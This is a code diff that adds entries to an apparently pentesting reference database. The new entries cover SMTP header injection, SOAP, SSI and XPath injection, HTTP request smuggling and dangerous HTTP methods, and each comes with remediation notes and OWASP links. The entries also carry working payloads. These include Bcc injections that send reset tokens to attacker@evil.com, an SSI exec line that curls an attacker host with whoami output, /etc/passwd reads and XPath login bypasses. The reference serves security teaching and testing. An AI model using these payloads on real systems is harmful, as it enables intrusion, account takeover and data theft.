@@ -26,6 +26,156 @@ var VULNS = [
     category: "Injection",
     vulns: [
       {
+        "id": "smtp-injection",
+        "name": "SMTP / Email Header Injection",
+        "severity": "Medium",
+        "ref": "https://owasp.org/www-community/vulnerabilities/SMTP_Injection",
+        "description": "Newline characters in input that builds an email let an attacker inject extra SMTP headers - adding hidden recipients, spoofing headers, or relaying spam.",
+        "brief": "Any feature that sends mail (contact forms, invitations, password reset, notifications) usually builds the message headers from user input such as the sender name, subject, or recipient. Email headers are separated by CRLF, so if those newlines are not stripped an attacker can inject additional headers or body content - most damagingly a hidden Bcc/Cc that silently copies the mail (and any token it carries) to the attacker.\n\nImpact: interception of reset tokens and confirmation links via injected Cc/Bcc, header spoofing, and turning the application into an open relay for spam and phishing.",
+        "quickReference": [
+          { "label": "Add a hidden BCC", "cmd": "name=Bob%0d%0aBcc:attacker@evil.com" },
+          { "label": "Inject into the reset email", "cmd": "email=victim@target.com%0d%0acc:attacker@evil.com" },
+          { "label": "Spoof the subject / body", "cmd": "subject=Hi%0d%0aX-Injected:1%0d%0a%0d%0aInjected body" }
+        ],
+        "sections": [
+          { "title": "How It's Exploited", "type": "commands", "commands": [
+            { "label": "1. Find a mail-sending feature that reflects input", "cmd": "# contact form, invite, share-by-email, password reset\n# any field (name, subject, from, to) that ends up in the message headers is a sink" },
+            { "label": "2. Inject CRLF + a header", "cmd": "# URL-encoded newlines: %0d%0a (CR LF)\nname=Attacker%0d%0aBcc:attacker@evil.com\n# if a copy of the mail reaches attacker@evil.com, injection is confirmed" },
+            { "label": "3. Escalate", "cmd": "# steal reset tokens by CC-ing yourself on a victim's reset:\nemail=victim@target.com%0d%0aBcc:attacker@evil.com\n# or inject a full body to send spoofed mail from the app's trusted domain" }
+          ]},
+          { "title": "Injectable Headers", "type": "table", "columns": ["Header", "Abuse"], "rows": [
+            ["Bcc / Cc", "Silently copy the message (and its tokens) to the attacker"],
+            ["To", "Redirect or add recipients"],
+            ["From / Reply-To", "Spoof the sender for phishing"],
+            ["Subject / body", "Inject arbitrary content, relay spam"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "OWASP - SMTP Injection", "url": "https://owasp.org/www-community/vulnerabilities/SMTP_Injection" },
+            { "label": "OWASP WSTG - Testing for IMAP/SMTP Injection", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_IMAP_SMTP_Injection" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Strip or reject CR and LF (and their encoded variants) from every value used to build an email header.",
+            "Use a well-maintained mail library and pass recipients/headers through its API rather than concatenating raw strings.",
+            "Validate email addresses against a strict allow-list format and reject anything with newlines, extra @, or header keywords.",
+            "Set recipients server-side where possible instead of taking them from the request."
+          ]}
+        ]
+      },
+      {
+        "id": "soap-injection",
+        "name": "SOAP Injection",
+        "severity": "Medium",
+        "ref": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/",
+        "description": "Unsanitised input placed into a SOAP/XML message lets an attacker inject extra elements and manipulate the request the backend processes.",
+        "brief": "SOAP web services carry parameters inside an XML envelope. When an application builds that XML by concatenating user input without encoding it, an attacker can inject XML metacharacters and elements to break out of the intended value - changing other fields, adding elements, or malforming the document to alter the backend's behaviour. It is the XML analogue of SQL injection and frequently sits alongside XXE on XML-based services.\n\nImpact: authentication bypass, tampering with values the client should not control (price, role, quantity), data disclosure, and denial of service through malformed XML.",
+        "quickReference": [
+          { "label": "Break the XML structure", "cmd": "value</arg><arg>injected   (does the response error or change?)" },
+          { "label": "Inject XML metacharacters", "cmd": "test payloads:  <  >  &  ]]>  and unbalanced tags" },
+          { "label": "Add an element the server trusts", "cmd": "user</username><role>admin</role><username>user" },
+          { "label": "Combine with XXE", "cmd": "switch to XML sinks and try external entities too" }
+        ],
+        "sections": [
+          { "title": "How It's Exploited", "type": "commands", "commands": [
+            { "label": "1. Probe with XML metacharacters", "cmd": "# submit <, >, & and closing tags in each field and watch for errors or changed behaviour\n<username>test</username>  ->  <username>test</username><injected>1</injected>" },
+            { "label": "2. Inject a trusted element", "cmd": "# if the envelope is built by string concatenation, close the value and add your own:\nusername = bob</username><role>administrator</role><username>\n# result: the server may parse an extra <role> it did not expect" },
+            { "label": "3. Malform to alter logic or DoS", "cmd": "# unbalanced tags, CDATA (]]>), or recursive/expanding structures\n# to break parsing, change the effective query, or exhaust the parser" }
+          ]},
+          { "title": "What It Enables", "type": "table", "columns": ["Effect", "Example"], "rows": [
+            ["Field/parameter tampering", "Change price, quantity, role, or user id in the request"],
+            ["Authentication bypass", "Inject or overwrite auth-related elements"],
+            ["Data disclosure", "Coax the service into returning extra data"],
+            ["Denial of service", "Malformed or expanding XML crashes the parser"],
+            ["Chained XXE", "External entities on the same XML sink"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "OWASP WSTG - Input Validation Testing", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/" },
+            { "label": "PortSwigger - XXE / XML attacks", "url": "https://portswigger.net/web-security/xxe" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Never build XML/SOAP messages by string concatenation; use a proper XML API that encodes values.",
+            "XML-encode all user input (< > & ' \") before it enters the document.",
+            "Validate requests against a strict XML Schema (XSD) and reject anything that does not conform.",
+            "Disable external entity resolution to prevent chained XXE, and apply strict server-side validation on every value."
+          ]}
+        ]
+      },
+      {
+        "id": "ssi-injection",
+        "name": "Server-Side Includes (SSI) Injection",
+        "severity": "High",
+        "ref": "https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection",
+        "description": "Input reflected into a page that the server parses for SSI directives lets an attacker run commands or read files as the page is rendered.",
+        "brief": "Server-Side Includes are directives (like <!--#include -->, <!--#exec -->) that a web server evaluates while assembling a page, typically in .shtml files. If user input is written into such a page without sanitisation, an attacker can inject their own SSI directives, which the server then executes - reading files, printing environment variables, or running operating-system commands.\n\nImpact: file disclosure, information leakage, and often remote command execution, depending on which SSI directives the server permits.",
+        "quickReference": [
+          { "label": "Detect", "cmd": "inject:  <!--#echo var=\"DATE_LOCAL\" -->   (does the date render?)" },
+          { "label": "Read a file", "cmd": "<!--#include virtual=\"/etc/passwd\" -->" },
+          { "label": "Run a command", "cmd": "<!--#exec cmd=\"id\" -->" },
+          { "label": "ESI variant", "cmd": "<esi:include src=\"http://attacker/\" />   (Edge Side Includes)" }
+        ],
+        "sections": [
+          { "title": "How It's Exploited", "type": "commands", "commands": [
+            { "label": "1. Confirm SSI is processed", "cmd": "# inject a harmless directive into a reflected/stored field:\n<!--#echo var=\"DATE_LOCAL\" -->\n# if the current date appears in the response, SSI is being evaluated" },
+            { "label": "2. Read files / leak info", "cmd": "<!--#include virtual=\"/etc/passwd\" -->\n<!--#printenv -->" },
+            { "label": "3. Command execution", "cmd": "<!--#exec cmd=\"id\" -->\n<!--#exec cmd=\"curl http://attacker/$(whoami)\" -->\n# whether exec is allowed depends on the server config (IncludesNOEXEC disables it)" }
+          ]},
+          { "title": "Directives to Try", "type": "table", "columns": ["Directive", "Effect"], "rows": [
+            ["<!--#echo var=... -->", "Print server variables - low-risk detection"],
+            ["<!--#include -->", "Include/read another file"],
+            ["<!--#exec cmd=... -->", "Run an OS command (if enabled) - RCE"],
+            ["<!--#printenv -->", "Dump all environment variables"],
+            ["<esi:include ...>", "Edge Side Includes - SSRF/RCE on caching proxies"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "OWASP - SSI Injection", "url": "https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection" },
+            { "label": "OWASP WSTG - Testing for SSI Injection", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Do not reflect user input into pages that the server parses for SSI (.shtml and configured extensions).",
+            "HTML-encode user input so SSI directive characters (< ! -- # >) cannot form a directive.",
+            "Disable SSI where it is not needed, and set IncludesNOEXEC to forbid the exec directive where SSI is required.",
+            "Validate input strictly and keep the web server configuration minimal and patched."
+          ]}
+        ]
+      },
+      {
+        "id": "xpath-injection",
+        "name": "XPath Injection",
+        "severity": "Medium",
+        "ref": "https://owasp.org/www-community/attacks/XPATH_Injection",
+        "description": "Unsanitised input inside an XPath query lets an attacker alter the query to bypass authentication or extract the whole XML document.",
+        "brief": "Applications that store data in XML often query it with XPath. When user input is concatenated into an XPath expression without escaping, an attacker can inject XPath syntax to change the query's logic - the direct analogue of SQL injection. Because XPath has no access-control model, a successful injection can usually read the entire document, and where XPath drives authentication it becomes a login bypass.\n\nImpact: authentication bypass and full disclosure of the backing XML data (which frequently contains all users and credentials).",
+        "quickReference": [
+          { "label": "Auth bypass", "cmd": "username: ' or '1'='1     password: ' or '1'='1" },
+          { "label": "Always-true tail", "cmd": "value' or '1'='1   /   value' or 1=1 or 'a'='a" },
+          { "label": "Break out and read", "cmd": "']/*  |  //user  (enumerate other nodes)" },
+          { "label": "Blind XPath", "cmd": "boolean substring() tests to extract data character by character" }
+        ],
+        "sections": [
+          { "title": "How It's Exploited", "type": "commands", "commands": [
+            { "label": "1. Detect with metacharacters", "cmd": "# submit ' \" [ ] ( ) and watch for XPath/XML errors or changed results\nusername = test'" },
+            { "label": "2. Authentication bypass", "cmd": "# the backend builds:  //user[name/text()='INPUT' and pass/text()='INPUT']\n# inject an always-true condition:\nname:  ' or '1'='1\npass:  ' or '1'='1\n# -> the filter matches the first user and logs you in" },
+            { "label": "3. Extract data (blind)", "cmd": "# no error output? use boolean/substring oracles:\n' or substring(//user[1]/password,1,1)='a\n# iterate positions and characters to recover values" }
+          ]},
+          { "title": "Notes vs SQLi", "type": "table", "columns": ["Aspect", "XPath Injection"], "rows": [
+            ["Backing store", "XML document queried with XPath"],
+            ["Access control", "None - any node is reachable once you can inject"],
+            ["Classic payload", "' or '1'='1  (identical shape to SQLi)"],
+            ["Blind technique", "substring() + boolean oracles"],
+            ["Impact", "Auth bypass and full document disclosure"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "OWASP - XPath Injection", "url": "https://owasp.org/www-community/attacks/XPATH_Injection" },
+            { "label": "OWASP WSTG - Testing for XPath Injection", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Use parameterised XPath (precompiled expressions with variable binding) instead of concatenating input.",
+            "Escape or reject XPath metacharacters ( ' \" [ ] ( ) / and whitespace ) in user input.",
+            "Apply strict allow-list validation on fields used in queries.",
+            "Do not store credentials in XML queried this way; where possible move authentication to a hardened store."
+          ]}
+        ]
+      },
+      {
         "id": "crlf-injection",
         "name": "CRLF / HTTP Response Header Injection",
         "severity": "Medium",
@@ -1654,6 +1804,46 @@ var VULNS = [
     {
     category: "Server-Side",
     vulns: [
+      {
+        "id": "http-request-smuggling",
+        "name": "HTTP Request Smuggling",
+        "severity": "High",
+        "ref": "https://portswigger.net/web-security/request-smuggling",
+        "description": "A front-end and back-end server disagree on where a request ends, letting an attacker smuggle a hidden request that affects other users.",
+        "brief": "When traffic passes through a chain of servers (CDN/proxy in front of an application server), both must agree on each request's boundary. If one uses the Content-Length header and the other uses Transfer-Encoding: chunked - and they can be made to disagree - an attacker can append a partial 'smuggled' request that the back-end treats as the start of the next user's request.\n\nImpact: capturing other users' requests (including their cookies/credentials), poisoning responses served to them, bypassing front-end security controls, and turning a reflected issue into a widespread one. The main variants are CL.TE, TE.CL, and TE.TE.",
+        "quickReference": [
+          { "label": "CL.TE - front-end uses Content-Length", "cmd": "Content-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG   (the 'G' is prepended to the next request)" },
+          { "label": "TE.CL - front-end uses Transfer-Encoding", "cmd": "Content-Length: 3\nTransfer-Encoding: chunked\n\n<chunk sizes crafted so the back-end stops early>" },
+          { "label": "TE.TE - obfuscate the header", "cmd": "Transfer-Encoding: xchunked  /  Transfer-Encoding:[tab]chunked  (one server ignores it)" },
+          { "label": "Detect safely", "cmd": "use Burp Suite + the HTTP Request Smuggler extension (timing-based probes)" }
+        ],
+        "sections": [
+          { "title": "How It's Exploited", "type": "commands", "commands": [
+            { "label": "1. Detect with a timing probe", "cmd": "# send a request that, if smuggling works, makes the back-end wait for more data\n# a delayed response indicates a desync. Burp 'HTTP Request Smuggler' automates this\n# CL.TE detection body:\nContent-Length: 4\nTransfer-Encoding: chunked\n\n1\nA\nX" },
+            { "label": "2. Confirm with a smuggled prefix", "cmd": "# smuggle the start of a request so the NEXT visitor's request is appended to it\n# e.g. force their request onto an endpoint you control and observe the effect" },
+            { "label": "3. Weaponise", "cmd": "# capture another user's request (steal cookies), or\n# poison the response queue so victims receive your response, or\n# bypass a front-end WAF/auth check by hiding the real request from it" }
+          ]},
+          { "title": "Variants & Impact", "type": "table", "columns": ["Variant", "Cause / Impact"], "rows": [
+            ["CL.TE", "Front-end uses Content-Length, back-end uses Transfer-Encoding"],
+            ["TE.CL", "Front-end uses Transfer-Encoding, back-end uses Content-Length"],
+            ["TE.TE", "Both support TE but one is tricked into ignoring an obfuscated header"],
+            ["Impact - request capture", "Steal victims' cookies/credentials from their requests"],
+            ["Impact - response poisoning", "Serve attacker content to other users"],
+            ["Impact - control bypass", "Hide a request from the front-end WAF/auth layer"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "PortSwigger - HTTP request smuggling", "url": "https://portswigger.net/web-security/request-smuggling" },
+            { "label": "HTTP Request Smuggler (Burp extension)", "url": "https://github.com/PortSwigger/http-request-smuggler" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Make the whole chain handle request boundaries identically - ideally use HTTP/2 end to end and downgrade carefully.",
+            "Configure the front-end to normalise ambiguous requests and reject any with both Content-Length and Transfer-Encoding.",
+            "Reject malformed or obfuscated Transfer-Encoding headers rather than trying to interpret them.",
+            "Disable connection reuse to the back-end where feasible, so a smuggled prefix cannot bleed into another user's request.",
+            "Keep proxies, load balancers, and application servers patched - many desync bugs are fixed at that layer."
+          ]}
+        ]
+      },
       {
         "id": "host-header-injection",
         "name": "Host Header Injection",
@@ -4528,6 +4718,44 @@ var VULNS = [
     {
     category: "Misconfigurations",
     vulns: [
+      {
+        "id": "dangerous-http-methods",
+        "name": "Dangerous HTTP Methods",
+        "severity": "Medium",
+        "ref": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods",
+        "description": "The server allows risky HTTP methods (PUT, DELETE, TRACE, CONNECT) that can upload/delete files or enable cross-site attacks.",
+        "brief": "Web servers support methods beyond GET and POST. Left enabled without proper authorisation, PUT may let an attacker upload files (including a web shell), DELETE may remove them, and TRACE enables Cross-Site Tracing (XST) to read headers a victim's browser would not otherwise expose. CONNECT can turn the server into a proxy. Many of these are configuration defaults that serve no purpose for the application.\n\nImpact: file upload leading to remote code execution (PUT), destructive deletion (DELETE), credential/cookie exposure (TRACE/XST), and open-proxy abuse (CONNECT).",
+        "quickReference": [
+          { "label": "List allowed methods", "cmd": "curl -s -i -X OPTIONS https://target/  | grep -i allow" },
+          { "label": "Test PUT (file upload)", "cmd": "curl -i -X PUT https://target/shell.txt -d 'pwned'  ->  then GET it back" },
+          { "label": "Test DELETE", "cmd": "curl -i -X DELETE https://target/uploads/test.txt" },
+          { "label": "Test TRACE (XST)", "cmd": "curl -i -X TRACE https://target/  (echoes the request - XST if reflected)" }
+        ],
+        "sections": [
+          { "title": "How It's Tested", "type": "commands", "commands": [
+            { "label": "1. Enumerate the allowed methods", "cmd": "curl -s -i -X OPTIONS https://target/ | grep -i '^allow'\nnmap --script http-methods -p 80,443 target" },
+            { "label": "2. Try to upload with PUT", "cmd": "curl -i -X PUT https://target/poc.html -H 'Content-Type: text/html' -d '<h1>poc</h1>'\ncurl -s https://target/poc.html   # served back? potential RCE with an executable extension" },
+            { "label": "3. Try DELETE and TRACE", "cmd": "curl -i -X DELETE https://target/poc.html      # destructive test - use with authorisation\ncurl -i -X TRACE https://target/                # request echoed = XST possible" }
+          ]},
+          { "title": "Methods & Risk", "type": "table", "columns": ["Method", "Risk if enabled"], "rows": [
+            ["PUT", "Upload arbitrary files -> web shell / RCE"],
+            ["DELETE", "Remove files -> defacement / denial of service"],
+            ["TRACE", "Cross-Site Tracing (XST) - read otherwise-hidden headers/cookies"],
+            ["CONNECT", "Use the server as an open proxy"],
+            ["OPTIONS", "Not dangerous itself, but discloses the method list"]
+          ]},
+          { "title": "References", "type": "references", "items": [
+            { "label": "OWASP WSTG - Test HTTP Methods", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods" },
+            { "label": "OWASP - Cross Site Tracing", "url": "https://owasp.org/www-community/attacks/Cross_Site_Tracing" }
+          ]},
+          { "title": "Remediation", "type": "notes", "items": [
+            "Disable every method the application does not need - typically leave only GET, POST, and HEAD (plus PUT/DELETE only where a REST API requires them, with authorisation).",
+            "Disable TRACE and CONNECT at the web server entirely.",
+            "Enforce authentication and authorisation on any state-changing method rather than relying on it being 'hidden'.",
+            "Confirm the change on every host and virtual host, since method configuration is often per-server."
+          ]}
+        ]
+      },
       {
         "id": "subdomain-takeover",
         "name": "Subdomain Takeover",
